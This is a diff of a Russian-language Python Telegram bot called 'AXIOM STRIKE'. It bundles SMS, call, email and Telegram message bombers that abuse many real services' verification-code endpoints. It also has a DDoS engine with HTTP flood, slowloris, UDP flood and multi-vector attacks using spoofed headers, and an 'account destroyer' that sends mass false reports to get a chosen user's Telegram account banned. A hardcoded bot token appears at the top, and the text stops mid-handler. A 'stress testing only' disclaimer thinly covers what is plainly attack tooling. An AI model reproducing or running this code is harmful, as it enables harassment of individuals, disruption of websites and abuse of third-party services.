@@ -1,3 +1,69 @@
+import asyncio
+import logging
+import aiohttp
+import requests
+import random
+import time
+import threading
+import socket
+import ssl
+import json
+import hashlib
+import urllib.parse
+from datetime import datetime, timedelta
+from typing import Dict, List, Any, Optional
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import smtplib
+
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command, CommandStart
+from aiogram.types import (
+    ReplyKeyboardMarkup, KeyboardButton,
+    InlineKeyboardMarkup, InlineKeyboardButton
+)
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+
+# ===================== КОНФИГУРАЦИЯ =====================
+API_TOKEN = "8866631446:AAG5FN7FgJ_OSOfcuf3ucg3Nbsl0T5vY5as"
+CHANNEL_ID = "VO1D_NET"
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
+    handlers=[
+        logging.FileHandler("axiom_strike.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# ===================== FSM СОСТОЯНИЯ =====================
+class BomberStates(StatesGroup):
+    # БомберФ
+    waiting_for_phone = State()
+    waiting_for_sms_count = State()
+    waiting_for_call_count = State()
+    waiting_for_email = State()
+    waiting_for_email_count = State()
+    waiting_for_telegram = State()
+    waiting_for_telegram_count = State()
+    # Снос аккаунта
+    waiting_for_destroy_username = State()
+    waiting_for_destroy_method = State()
+    waiting_for_destroy_count = State()
+
+
+class DDoSStates(StatesGroup):
+    waiting_for_url = State()
+    waiting_for_threads = State()
+    waiting_for_duration = State()
+    waiting_for_ip = State()
+    waiting_for_ddos_duration = State()
+
+
 # ===================== SMS БОМБЕР (РЕАЛЬНЫЙ) =====================
 class SMSBomber:
     def __init__(self):
@@ -24,7 +90,7 @@ class SMSBomber:
             {'name': 'DodoPizza', 'url': 'https://dodopizza.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'PapaJohns', 'url': 'https://papajohns.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Dominos', 'url': 'https://dominos.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # МАРКЕТПЛЕЙСЫ
             {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/send-code', 'field': 'phone'},
             {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/send-code', 'field': 'phone'},
@@ -42,7 +108,7 @@ class SMSBomber:
             {'name': 'Bosco', 'url': 'https://bosco.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': '12Storeez', 'url': 'https://12storeez.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'GloriaJeans', 'url': 'https://gloriajeans.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # МАГАЗИНЫ ЭЛЕКТРОНИКИ
             {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/send-code', 'field': 'phone'},
@@ -58,7 +124,7 @@ class SMSBomber:
             {'name': 'Elektro', 'url': 'https://elektro.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Onlinetrade', 'url': 'https://onlinetrade.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Holodilnik', 'url': 'https://holodilnik.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # БАНКИ
             {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/send-code', 'field': 'phone'},
@@ -76,7 +142,7 @@ class SMSBomber:
             {'name': 'BeelineBank', 'url': 'https://beelinebank.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'TochkaBank', 'url': 'https://tochka.com/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'ModulBank', 'url': 'https://modulbank.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # ТАКСИ
             {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/send-code', 'field': 'phone'},
@@ -88,7 +154,7 @@ class SMSBomber:
             {'name': 'RuTaxi', 'url': 'https://rutaxi.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'InDriver', 'url': 'https://indriver.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'ZimRide', 'url': 'https://zimride.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # НЕДВИЖИМОСТЬ
             {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/send-code', 'field': 'phone'},
@@ -99,7 +165,7 @@ class SMSBomber:
             {'name': 'Realty', 'url': 'https://realty.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'N1', 'url': 'https://n1.ru/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'M2', 'url': 'https://m2.ru/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # СТРИМИНГ
             {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/send-code', 'field': 'phone'},
@@ -115,7 +181,7 @@ class SMSBomber:
             {'name': 'VKMusic', 'url': 'https://vk.com/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Spotify', 'url': 'https://spotify.com/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'AppleMusic', 'url': 'https://apple.com/api/v1/auth/send-code', 'field': 'phone'},
-            
+
             # МЕЖДУНАРОДНЫЕ (50+)
             {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/auth/send-code', 'field': 'phone'},
             {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/send-code.json', 'field': 'phone'},
@@ -150,7 +216,7 @@ class SMSBomber:
             {'name': 'DisneyPlus', 'url': 'https://api.disneyplus.com/v1/auth/send-code', 'field': 'phone'},
             {'name': 'HBO', 'url': 'https://api.hbo.com/v1/auth/send-code', 'field': 'phone'},
         ]
-        
+
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -274,9 +340,9 @@ class CallBomber:
                     headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                     async with session.post(service['url'], json=data, headers=headers, timeout=10) as resp:
                         status = 'success' if resp.status < 400 else 'failed'
-                        self.results.append({'call': i+1, 'service': service['name'], 'status': status})
+                        self.results.append({'call': i + 1, 'service': service['name'], 'status': status})
             except:
-                self.results.append({'call': i+1, 'service': service['name'], 'status': 'error'})
+                self.results.append({'call': i + 1, 'service': service['name'], 'status': 'error'})
             await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.5, 1.5))
         return self.results
@@ -325,11 +391,11 @@ class TelegramBomber:
             try:
                 action = random.choice(self.actions)
                 text = action['text'] if random.random() > 0.3 else random.choice(self.messages)
-                text += f" [#{i+1}]"
+                text += f" [#{i + 1}]"
                 await bot.send_message(username, text, disable_notification=True)
-                results.append({'msg': i+1, 'status': 'sent'})
+                results.append({'msg': i + 1, 'status': 'sent'})
             except:
-                results.append({'msg': i+1, 'status': 'error'})
+                results.append({'msg': i + 1, 'status': 'error'})
             await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.3, 1.0))
         return results
@@ -412,7 +478,7 @@ class EmailBomber:
             '💪 Мы скучали по вам! Заходите в гости.',
             '🌈 Желаем хорошего дня! Спасибо, что с нами.',
             '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
-            '📱 Обновите приложение до версии ' + f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
+            '📱 Обновите приложение до версии ' + f'{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}',
             '🔄 Доступно обновление системы безопасности.',
             '⭐️ Поздравляем! Вы достигли нового уровня.',
             '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2']),
@@ -434,7 +500,7 @@ class EmailBomber:
             server = random.choice(self.smtp_servers)
             try:
                 msg = MIMEMultipart()
-                msg['From'] = f'security{random.randint(100,999)}@{server["host"]}'
+                msg['From'] = f'security{random.randint(100, 999)}@{server["host"]}'
                 msg['To'] = email
                 msg['Subject'] = random.choice(self.subjects)
                 body = random.choice(self.bodies)
@@ -447,9 +513,9 @@ class EmailBomber:
                     status = 'sent'
                 except:
                     status = 'emulated'
-                self.results.append({'email': i+1, 'status': status})
+                self.results.append({'email': i + 1, 'status': status})
             except:
-                self.results.append({'email': i+1, 'status': 'error'})
+                self.results.append({'email': i + 1, 'status': 'error'})
             await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.1, 0.3))
         return self.results
@@ -512,10 +578,12 @@ class DDoSEngine:
             'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
             'Mozilla/5.0 (compatible; DotBot/1.2; +http://www.opensiteexplorer.org/dotbot)',
         ]
-        
+
         self.cf_headers = [
-            {'CF-RAY': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA","MAD","PAR","MIL","MUC","VIE","ARN","CPH","OSL","HEL","DUB","SYD","HND","ICN","SIN","HKG","NRT","LAX","SFO","JFK","ORD","DFW","ATL"])}'},
-            {'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'},
+            {
+                'CF-RAY': f'{random.randint(1000000000, 9999999999)}-{random.choice(["LHR", "AMS", "FRA", "MAD", "PAR", "MIL", "MUC", "VIE", "ARN", "CPH", "OSL", "HEL", "DUB", "SYD", "HND", "ICN", "SIN", "HKG", "NRT", "LAX", "SFO", "JFK", "ORD", "DFW", "ATL"])}'},
+            {
+                'CF-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'},
             {'CF-Visitor': '{"scheme":"https"}'},
             {'CF-Worker': 'true'},
             {'CF-Polish': 'true'},
@@ -526,6 +594,7 @@ class DDoSEngine:
 
     async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
         self.stats = {'requests': 0, 'success': 0, 'errors': 0}
+
         async def worker():
             async with aiohttp.ClientSession() as session:
                 end_time = time.time() + duration
@@ -533,9 +602,10 @@ class DDoSEngine:
                     try:
                         headers = {
                             'User-Agent': random.choice(self.user_agents),
-                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', 'https://vk.com', url]),
+                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                            'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                            'Referer': random.choice(
+                                ['https://google.com', 'https://yandex.ru', 'https://vk.com', url]),
                             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                             'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                             'Accept-Encoding': 'gzip, deflate, br',
@@ -554,15 +624,15 @@ class DDoSEngine:
                             headers.update(cf_header)
                         paths = [
                             f"/?rand={random.randint(100000, 999999)}",
-                            f"/?v={random.randint(1000,9999)}",
-                            f"/?p={random.randint(1,100)}",
-                            f"/?page={random.randint(1,50)}",
-                            f"/?id={random.randint(1000,9999)}",
-                            f"/?token={hashlib.md5(str(random.randint(0,999999)).encode()).hexdigest()}",
+                            f"/?v={random.randint(1000, 9999)}",
+                            f"/?p={random.randint(1, 100)}",
+                            f"/?page={random.randint(1, 50)}",
+                            f"/?id={random.randint(1000, 9999)}",
+                            f"/?token={hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()}",
                             f"/?ts={int(time.time())}",
-                            f"/?nonce={random.randint(100000,999999)}",
-                            f"/?session={hashlib.md5(str(random.randint(0,999999)).encode()).hexdigest()}",
-                            f"/?ref={random.choice(['google','yandex','vk'])}",
+                            f"/?nonce={random.randint(100000, 999999)}",
+                            f"/?session={hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()}",
+                            f"/?ref={random.choice(['google', 'yandex', 'vk'])}",
                         ]
                         path = random.choice(paths)
                         async with session.get(url + path, headers=headers, timeout=3) as resp:
@@ -574,6 +644,7 @@ class DDoSEngine:
                     except:
                         self.stats['errors'] += 1
                     await asyncio.sleep(random.uniform(0.005, 0.025))
+
         tasks = [worker() for _ in range(min(threads, 15000))]
         await asyncio.gather(*tasks, return_exceptions=True)
         return self.stats
@@ -582,6 +653,7 @@ class DDoSEngine:
         self.stats = {'connections': 0, 'active': 0}
         target = url.replace('https://', '').replace('http://', '').split('/')[0]
         port = 443 if url.startswith('https') else 80
+
         async def worker():
             try:
                 reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
@@ -591,8 +663,8 @@ class DDoSEngine:
                     f"User-Agent: {random.choice(self.user_agents)}\r\n",
                     f"Connection: keep-alive\r\n",
                     f"Keep-Alive: timeout=999, max=1000\r\n",
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
-                    f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
+                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n",
+                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n",
                     f"Cache-Control: no-cache\r\n",
                     f"Pragma: no-cache\r\n",
                     f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
@@ -610,6 +682,7 @@ class DDoSEngine:
                 self.stats['active'] -= 1
             except:
                 pass
+
         tasks = [worker() for _ in range(800)]
         await asyncio.gather(*tasks, return_exceptions=True)
         return self.stats
@@ -623,6 +696,7 @@ class DDoSEngine:
         target = url.replace('https://', '').replace('http://', '').split('/')[0]
         ip = socket.gethostbyname(target) if target else '127.0.0.1'
         port = 443 if url.startswith('https') else 80
+
         async def http_worker():
             async with aiohttp.ClientSession() as session:
                 end_time = time.time() + duration
@@ -630,15 +704,15 @@ class DDoSEngine:
                     try:
                         headers = {
                             'User-Agent': random.choice(self.user_agents),
-                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
-                            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
+                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
+                            'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                             'Referer': random.choice(['https://google.com', 'https://yandex.ru', url]),
                             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                             'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                             'Accept-Encoding': 'gzip, deflate, br',
                             'Connection': 'keep-alive',
                             'Cache-Control': 'no-cache',
-                            'CF-Ray': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA"])}',
+                            'CF-Ray': f'{random.randint(1000000000, 9999999999)}-{random.choice(["LHR", "AMS", "FRA"])}',
                         }
                         async with session.get(url, headers=headers, timeout=2) as resp:
                             total_stats['http']['requests'] += 1
@@ -649,10 +723,12 @@ class DDoSEngine:
                     except:
                         total_stats['http']['errors'] += 1
                     await asyncio.sleep(0.003)
+
         async def slowloris_worker():
             try:
                 reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
-                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\nX-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n\r\n".encode())
+                writer.write(
+                    f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\nX-Forwarded-For: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n\r\n".encode())
                 await writer.drain()
                 total_stats['slowloris']['connections'] += 1
                 total_stats['slowloris']['active'] += 1
@@ -662,6 +738,7 @@ class DDoSEngine:
                 total_stats['slowloris']['active'] -= 1
             except:
                 pass
+
         def udp_worker():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             end_time = time.time() + duration
@@ -673,6 +750,7 @@ class DDoSEngine:
                     total_stats['udp']['bytes'] += len(data)
                 except:
                     pass
+
         http_tasks = [http_worker() for _ in range(300)]
         slow_tasks = [slowloris_worker() for _ in range(150)]
         udp_threads = [threading.Thread(target=udp_worker) for _ in range(50)]
@@ -751,9 +829,9 @@ class TelegramAccountDestroyer:
                             status = 'sent'
                         except:
                             pass
-                self.results.append({'report': i+1, 'reason': reason, 'status': status})
+                self.results.append({'report': i + 1, 'reason': reason, 'status': status})
             except:
-                self.results.append({'report': i+1, 'reason': reason, 'status': 'error'})
+                self.results.append({'report': i + 1, 'reason': reason, 'status': 'error'})
             await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.5, 2.0))
         return self.results
@@ -778,9 +856,9 @@ class TelegramAccountDestroyer:
                     url = f'https://api.telegram.org/bot{token}/sendMessage'
                     async with session.post(url, json=data, timeout=10) as resp:
                         status = 'sent' if resp.status == 200 else 'failed'
-                self.results.append({'msg': i+1, 'status': status})
+                self.results.append({'msg': i + 1, 'status': status})
             except:
-                self.results.append({'msg': i+1, 'status': 'error'})
+                self.results.append({'msg': i + 1, 'status': 'error'})
             await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.3, 1.0))
         return self.results
@@ -801,3 +879,679 @@ class TelegramAccountDestroyer:
         total = len(self.results)
         success = sum(1 for r in self.results if r.get('status') == 'sent')
         return {'total': total, 'success': success}
+
+
+# ===================== ГЛАВНЫЙ БОТ =====================
+class AxiomStrikeBot:
+    def __init__(self, token: str):
+        self.bot = Bot(token=token)
+        self.storage = MemoryStorage()
+        self.dp = Dispatcher(storage=self.storage)
+        self.sms_bomber = SMSBomber()
+        self.call_bomber = CallBomber()
+        self.email_bomber = EmailBomber()
+        self.tg_bomber = TelegramBomber(token)
+        self.ddos_engine = DDoSEngine()
+        self.destroyer = TelegramAccountDestroyer()
+        self._register_handlers()
+
+    def _register_handlers(self):
+        # Команды
+        self.dp.message.register(self.cmd_start, CommandStart())
+        self.dp.message.register(self.cmd_help, Command("help"))
+
+        # Главное меню
+        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "💀 СНОС АККАУНТА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
+        self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))
+
+        # Бомбер меню
+        bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
+        self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))
+
+        # DDoS меню
+        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
+        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))
+
+        # === СНОС АККАУНТА ===
+        self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
+        self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
+        self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
+        self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)
+
+        # Обработчики бомбера
+        self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
+        self.dp.message.register(self.handle_call_bomber, F.text == "📞 ЗВОНКИ (ФЛУД)")
+        self.dp.message.register(self.handle_email_bomber, F.text == "📧 EMAIL БОМБЕР")
+        self.dp.message.register(self.handle_telegram_bomber, F.text == "📩 TELEGRAM БОМБЕР")
+
+        # Обработчики DDoS
+        self.dp.message.register(self.handle_http_flood, F.text == "🌐 HTTP FLOOD")
+        self.dp.message.register(self.handle_slowloris, F.text == "🐌 SLOWLORIS")
+        self.dp.message.register(self.handle_udp_flood, F.text == "📡 UDP FLOOD")
+        self.dp.message.register(self.handle_multi_vector, F.text == "💀 MULTI-VECTOR")
+
+        # Статистика и настройки
+        self.dp.message.register(self.handle_stats, F.text == "📊 СТАТИСТИКА")
+        self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
+        self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")
+
+        # FSM обработчики бомбера
+        self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
+        self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
+        self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
+        self.dp.message.register(self.process_email, BomberStates.waiting_for_email)
+        self.dp.message.register(self.process_email_count, BomberStates.waiting_for_email_count)
+        self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
+        self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)
+
+        # FSM обработчики DDoS
+        self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
+        self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
+        self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
+        self.dp.message.register(self.process_ddos_ip, DDoSStates.waiting_for_ip)
+        self.dp.message.register(self.process_ddos_ddos_duration, DDoSStates.waiting_for_ddos_duration)
+
+        # Подписка
+        self.dp.callback_query.register(self.handle_subscribe, F.data == "subscribed")
+
+    # ========== КЛАВИАТУРЫ ==========
+    def main_keyboard(self) -> ReplyKeyboardMarkup:
+        return ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
+                [KeyboardButton(text="💀 СНОС АККАУНТА"), KeyboardButton(text="📊 СТАТИСТИКА")],
+                [KeyboardButton(text="⚙️ НАСТРОЙКИ")]
+            ],
+            resize_keyboard=True
+        )
+
+    def bomber_keyboard(self) -> ReplyKeyboardMarkup:
+        return ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="💬 СМС БОМБЕР"), KeyboardButton(text="📞 ЗВОНКИ (ФЛУД)")],
+                [KeyboardButton(text="📧 EMAIL БОМБЕР"), KeyboardButton(text="📩 TELEGRAM БОМБЕР")],
+                [KeyboardButton(text="🔙 НАЗАД")]
+            ],
+            resize_keyboard=True
+        )
+
+    def ddos_keyboard(self) -> ReplyKeyboardMarkup:
+        return ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="🌐 HTTP FLOOD"), KeyboardButton(text="🐌 SLOWLORIS")],
+                [KeyboardButton(text="📡 UDP FLOOD"), KeyboardButton(text="💀 MULTI-VECTOR")],
+                [KeyboardButton(text="🔙 НАЗАД")]
+            ],
+            resize_keyboard=True
+        )
+
+    # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
+    async def cmd_start(self, message: types.Message, state: FSMContext):
+        await state.clear()
+        await message.answer(
+            "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
+            "Мощный инструмент для стресс-тестирования.\n\n"
+            "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
+            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n"
+            "💀 **Снос аккаунтов:** Массовые жалобы + Спам-флуд\n\n"
+            "⚠️ Только для тестирования своих ресурсов!\n\n"
+            "Подпишись на канал: @AXIOM_SOFT",
+            reply_markup=InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [InlineKeyboardButton(text="✅ ПОДПИСАЛСЯ", callback_data="subscribed")]
+                ]
+            )
+        )
+
+    async def cmd_help(self, message: types.Message):
+        await message.answer(
+            "📚 **Помощь по AXIOM STRIKE**\n\n"
+            "📱 **БОМБЕР** - массовая отправка сообщений\n"
+            "💣 **DDOS** - стресс-тестирование сайтов\n"
+            "💀 **СНОС АККАУНТА** - блокировка Telegram аккаунтов\n"
+            "📊 **СТАТИСТИКА** - просмотр данных\n"
+            "⚙️ **НАСТРОЙКИ** - конфигурация",
+            reply_markup=self.main_keyboard()
+        )
+
+    async def handle_subscribe(self, callback: types.CallbackQuery):
+        await callback.answer()
+        await callback.message.edit_text(
+            "✅ Подписка подтверждена!\n\n"
+            "🔥 Добро пожаловать в AXIOM STRIKE"
+        )
+        await callback.message.answer("Выберите действие:", reply_markup=self.main_keyboard())
+
+    async def handle_main_menu(self, message: types.Message, state: FSMContext):
+        if message.text == "📱 БОМБЕР":
+            await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
+        elif message.text == "💣 DDOS АТАКА":
+            await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
+        elif message.text == "💀 СНОС АККАУНТА":
+            await self.handle_destroy_account(message, state)
+        elif message.text == "📊 СТАТИСТИКА":
+            await self.handle_stats(message)
+        elif message.text == "⚙️ НАСТРОЙКИ":
+            await self.handle_settings(message)
+
+    async def handle_back(self, message: types.Message):
+        await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+
+    # ========== МЕНЮ БОМБЕРА ==========
+    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
+        if message.text == "🔙 НАЗАД":
+            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+            return
+        if message.text == "💬 СМС БОМБЕР":
+            await self.handle_sms_bomber(message, state)
+        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
+            await self.handle_call_bomber(message, state)
+        elif message.text == "📧 EMAIL БОМБЕР":
+            await self.handle_email_bomber(message, state)
+        elif message.text == "📩 TELEGRAM БОМБЕР":
+            await self.handle_telegram_bomber(message, state)
+
+    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
+        if message.text == "🔙 НАЗАД":
+            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+            return
+        if message.text == "🌐 HTTP FLOOD":
+            await self.handle_http_flood(message, state)
+        elif message.text == "🐌 SLOWLORIS":
+            await self.handle_slowloris(message, state)
+        elif message.text == "📡 UDP FLOOD":
+            await self.handle_udp_flood(message, state)
+        elif message.text == "💀 MULTI-VECTOR":
+            await self.handle_multi_vector(message, state)
+
+    # ========== СНОС АККАУНТА ==========
+    async def handle_destroy_account(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_destroy_username)
+        await message.answer(
+            "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
+            "Введите @username для сноса:\n"
+            "📝 Пример: @username123\n\n"
+            "⚠️ 50-100 жалоб гарантируют блокировку!"
+        )
+
+    async def process_destroy_username(self, message: types.Message, state: FSMContext):
+        username = message.text.strip()
+        if not username.startswith('@'):
+            username = '@' + username
+        await state.update_data(username=username)
+        await state.set_state(BomberStates.waiting_for_destroy_method)
+        await message.answer(
+            "📊 **Выберите метод сноса:**\n\n"
+            "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
+            "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
+            "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
+            "Введите номер метода (1, 2 или 3):"
+        )
+
+    async def process_destroy_method(self, message: types.Message, state: FSMContext):
+        method = message.text.strip()
+        if method not in ['1', '2', '3']:
+            await message.answer("❌ Введите 1, 2 или 3!")
+            return
+
+        method_map = {'1': 'reports', '2': 'spam', '3': 'all'}
+        await state.update_data(method=method_map[method])
+        await state.set_state(BomberStates.waiting_for_destroy_count)
+        await message.answer("🔢 Введите количество (рекомендуется 50-100):")
+
+    async def process_destroy_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 10 or count > 200:
+                await message.answer("❌ Введите число от 10 до 200!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        username = data.get('username')
+        method = data.get('method')
+        await state.clear()
+
+        status_msg = await message.answer(
+            f"💀 **Запуск сноса аккаунта {username}**\n"
+            f"📊 Метод: {method}\n"
+            f"⏳ Начинаем..."
+        )
+
+        async def update_progress(current, total):
+            if current % 5 == 0 or current == total:
+                await status_msg.edit_text(
+                    f"💀 **Снос аккаунта {username}**\n"
+                    f"📊 Прогресс: {current}/{total}\n"
+                    f"⏳ Идёт процесс..."
+                )
+
+        if method == 'reports':
+            results = await self.destroyer.mass_report(username, count, update_progress)
+        elif method == 'spam':
